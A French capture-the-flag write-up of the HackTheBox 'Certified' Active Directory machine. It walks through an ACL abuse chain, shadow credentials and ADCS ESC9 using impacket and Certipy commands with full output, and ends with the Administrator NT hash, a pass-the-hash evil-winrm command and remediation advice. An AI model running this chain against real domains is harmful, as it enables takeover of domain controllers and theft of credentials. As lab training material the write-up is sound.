# Certified — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows (contrôleur de domaine) |
| **Difficulté** | 🟡 Medium |
| **Date** | 2026-10-06 |
| **Vecteur** | creds fournis (`judith.mader`) → WriteOwner sur **Management** → owner+FullControl+addmember → GenericWrite sur `management_svc` (**shadow creds**) → GenericAll sur `ca_operator` (**shadow creds**) → **ADCS ESC9** (UPN réécrit en Administrator) → certif → hash Administrator |
| **CVE** | — (abus de config ADCS + ACL) |
| **Tags** | active-directory · adcs · esc9 · shadow-credentials · acl |

> 🎯 **Nouveautés à apprendre (je cherche les commandes seul — cf. `outils/ad-memo.md`)** :
> 1) On te donne déjà un couple de creds (assumed breach) → **BloodHound** pour trouver la chaîne d'ACL.
> 2) **Shadow Credentials** : avec un droit d'écriture sur un compte, écrire son attribut **`msDS-KeyCredentialLink`** → s'authentifier **par certificat** à sa place (outil : **pyWhisker** / Certipy `shadow auto`).
> 3) **ADCS ESC9** : un template sans `szOID_NTDS_CA_SECURITY_EXT` permet de **réécrire le UPN** d'un compte pour demander un certif **au nom de l'Administrator**.
> 4) Enchaîne les arêtes : `WriteOwner` → prendre la propriété → s'octroyer `GenericAll` → shadow creds → ESC9.

> 💡 Concepts à googler : « shadow credentials msDS-KeyCredentialLink », « Certipy ESC9 », « pyWhisker », « WriteOwner abuse ».

---

## TL;DR

Assumed breach : on me donne `judith.mader:judith09`. BloodHound révèle une **chaîne d'ACL** : judith a
**WriteOwner** sur le groupe **Management** → je deviens owner (`owneredit`), je m'octroie FullControl
(`dacledit`) et je m'ajoute au groupe. Management a **GenericWrite** sur `management_svc` → **shadow
credentials** (Certipy) → hash NT de `management_svc`. Lui a **GenericAll** sur `ca_operator` → re-shadow →
hash NT de `ca_operator`. `ca_operator` a le droit d'enrôler sur un template vulnérable → **ADCS ESC9** :
je réécris son **UPN en `Administrator`**, je demande un certif (qui vaut donc pour l'admin), je remets le
UPN, puis j'authentifie le certif (PKINIT) → **hash NT de l'Administrator** → DC.

**judith → (WriteOwner) Management → (GenericWrite + shadow) management_svc → (GenericAll + shadow) ca_operator → (ESC9) Administrator.**

> ⚠️ Toute la box s'est jouée sur l'**horloge** : le DC est à **+7h** et systemd resynchronisait mon horloge en arrière → tous les appels Kerberos (Certipy, PKINIT) plantaient en `KRB_AP_ERR_SKEW`. Parade : **`faketime`** avec l'offset exact (+25201 s) sur chaque commande Certipy.

## 1. Reconnaissance & énumération

```bash
┌──(kali㉿kali)-[~/nmap/certified]
└─$ nmap -sC -sV -p- 10.129.231.186
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 08:36 +0200
Nmap scan report for 10.129.231.186
Host is up (0.048s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-06 13:39:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-06T13:41:15+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-06T13:41:14+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-06T13:41:15+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-10-06T13:41:15+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-06T13:40:38
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 308.28 seconds

┌──(kali㉿kali)-[~/nmap/certified]
└─$ nxc smb 10.129.231.186 -u 'judith.mader' -p 'judith09' --shares
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.231.186  445    DC01             [*] Enumerated shares
SMB         10.129.231.186  445    DC01             Share           Permissions     Remark
SMB         10.129.231.186  445    DC01             -----           -----------     ------
SMB         10.129.231.186  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.231.186  445    DC01             C$                              Default share
SMB         10.129.231.186  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.231.186  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.231.186  445    DC01             SYSVOL          READ            Logon server share

```

Partages lisibles mais sans loot direct → la box est en **assumed breach** : tout se joue sur les **ACL**.
Collecte BloodHound avec `judith.mader`, Mark as Owned, puis **Outbound Object Control**.

## 2. Chaîne d'ACL — judith → Management → management_svc → ca_operator

Chemin BloodHound :
```
judith.mader ──WriteOwner──▶ MANAGEMENT (groupe)
MANAGEMENT   ──GenericWrite─▶ management_svc (user)
management_svc ─GenericAll──▶ ca_operator (user)
```

**Méthode, maillon par maillon** (j'endosse chaque identité à tour de rôle) :
- `WriteOwner` → `owneredit` (devenir owner) → `dacledit` (FullControl) → `net rpc group addmem` (m'ajouter).
- `GenericWrite`/`GenericAll` sur un **user** → **shadow credentials** (`certipy shadow auto`) : écrire une clé dans `msDS-KeyCredentialLink` → s'authentifier par certificat → récupérer le **hash NT** (pas de mdp à casser).

- Hash NT `management_svc` : `a091c1832bcdd4677c28b5a6a1295584`
- Hash NT `ca_operator` : `b4b86f45c6018f1b664f70805f45d8f2`

```bash
┌──(kali㉿kali)-[~/nmap/certified]
└─$ impacket-owneredit -action write -new-owner judith.mader -target management -dc-ip 10.129.115.80 'certified.htb/judith.mader:judith09'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
                                                                                                       
┌──(kali㉿kali)-[~/nmap/certified]
└─$ impacket-owneredit -action read -target management -dc-ip 10.129.115.80 'certified.htb/judith.mader:judith09'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
                                                                                                       
┌──(kali㉿kali)-[~/nmap/certified]
└─$ impacket-dacledit -action write -rights FullControl -principal judith.mader -target management -dc-ip 10.129.115.80 'certified.htb/judith.mader:judith09'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20261006-120827.bak
[*] DACL modified successfully!
                                                                                                       
┌──(kali㉿kali)-[~/nmap/certified]
└─$ net rpc group addmem "Management" judith.mader -U "certified.htb/judith.mader%judith09" -S 10.129.115.80
                                                                                                       
┌──(kali㉿kali)-[~/nmap/certified]
└─$ net rpc group members "Management" -U "certified.htb/judith.mader%judith09" -S 10.129.115.80
CERTIFIED\judith.mader
CERTIFIED\management_svc

┌──(kali㉿kali)-[~/nmap/certified]
└─$ faketime "$(date -d @$(( $(date +%s) + 25201 )) '+%Y-%m-%d %H:%M:%S')" \
  certipy-ad shadow auto -u judith.mader@certified.htb -p 'judith09' -account management_svc -dc-ip 10.129.115.80
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '1a23a978f24c4f9cb2871a18efa6d7cf'
[*] Adding Key Credential with device ID '1a23a978f24c4f9cb2871a18efa6d7cf' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '1a23a978f24c4f9cb2871a18efa6d7cf' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584


```

## 3. Privesc — ADCS ESC9

**Le principe d'ESC9** : le template (`CertifiedAuthentication`) **n'a pas** l'extension de sécurité
`szOID_NTDS_CA_SECURITY_EXT` (flag `CT_FLAG_NO_SECURITY_EXTENSION`). Du coup le certif émis est lié au
compte **par son UPN** (texte), pas par son SID. Donc : avec `GenericWrite` sur `ca_operator`, je **réécris
son UPN en `Administrator`**, je demande un certif (le CA le remplit avec « Administrator »), je **remets**
l'UPN d'origine, puis j'authentifie le certif → le DC me prend pour l'**Administrator**.

Étapes : `certipy find -vulnerable` (repérer le template) → `account update -upn Administrator` →
`req` (demander le certif) → `account update -upn <origine>` (remettre) → `auth -pfx` (PKINIT → hash).

```bash
──(kali㉿kali)-[~/nmap/certified/targetedKerberoast/pywhisker]
└─$ certipy-ad find -vulnerable -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.115.80 -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates

┌──(kali㉿kali)-[~/nmap/certified/targetedKerberoast/pywhisker]
└─$ faketime "$(date -d @$(( $(date +%s) + 25201 )) '+%Y-%m-%d %H:%M:%S')" \
  certipy-ad shadow auto -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.115.80

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '5d9e26e20210420badb04047c14b1f36'
[*] Adding Key Credential with device ID '5d9e26e20210420badb04047c14b1f36' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '5d9e26e20210420badb04047c14b1f36' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2


┌──(kali㉿kali)-[~/nmap/certified/targetedKerberoast/pywhisker]
└─$ certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.115.80
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'

┌──(kali㉿kali)-[~/nmap/certified/targetedKerberoast/pywhisker]
└─$ certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.115.80
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                   
┌──(kali㉿kali)-[~/nmap/certified/targetedKerberoast/pywhisker]
└─$ certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.115.80
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'

┌──(kali㉿kali)-[~/nmap/certified/targetedKerberoast/pywhisker]
└─$ faketime "$(date -d @$(( $(date +%s) + 25201 )) '+%Y-%m-%d %H:%M:%S')" certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.115.80 -domain certified.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34


```

- Hash NT **Administrator** : `0d5b49608bbce1751f708748f67e2d34` → PtH : `evil-winrm -i dc01.certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34`

**Flag root :** `C:\Users\Administrator\Desktop\root.txt` (non publié).

## 4. Remédiation

- **ADCS** : activer l'extension de sécurité SID sur les templates (corrige ESC9) ; retirer le droit d'enrôlement aux comptes non légitimes ; auditer les templates avec Certipy côté défense.
- **Shadow creds** : auditer/limiter les écritures sur **`msDS-KeyCredentialLink`** ; Key Trust réservé aux usages légitimes (Windows Hello).
- **ACL** : revoir `WriteOwner`/`GenericWrite`/`GenericAll` sur groupes et comptes à privilèges.

## 5. Leçons

- **Chaîne de contrôle, pas « upgrade »** : on pivote d'identité en identité (judith → management_svc → ca_operator → administrator), chaque compte ayant un **droit** (arête) sur le suivant. On ne saute jamais directement à l'admin.
- **Shadow Credentials** : écrire une clé dans `msDS-KeyCredentialLink` → auth **par certificat** → **hash NT direct**, sans casser de mot de passe (idéal quand le mdp est aléatoire, comme `management_svc`).
- **ADCS ESC9** : template sans extension SID → le certif suit l'**UPN** → on réécrit l'UPN en `Administrator` pour obtenir un certif admin (penser à **remettre** l'UPN après).
- **`WriteOwner`** ne donne pas le contrôle direct : il faut devenir **owner** (`owneredit`) puis se réécrire la **DACL** (`dacledit`).
- **Piège horloge (majeur)** : DC à +7h + systemd qui resynchronise → `KRB_AP_ERR_SKEW` à répétition. Quand `ntpdate` « ne tient pas », utiliser **`faketime '+Xh'`** (ou l'offset exact) sur chaque commande Kerberos/Certipy. Et toujours viser la **bonne IP** après un reboot.

## Références
- Fiches liées : [ad-memo](../outils/ad-memo.md) · [bloodhound](../outils/bloodhound.md)
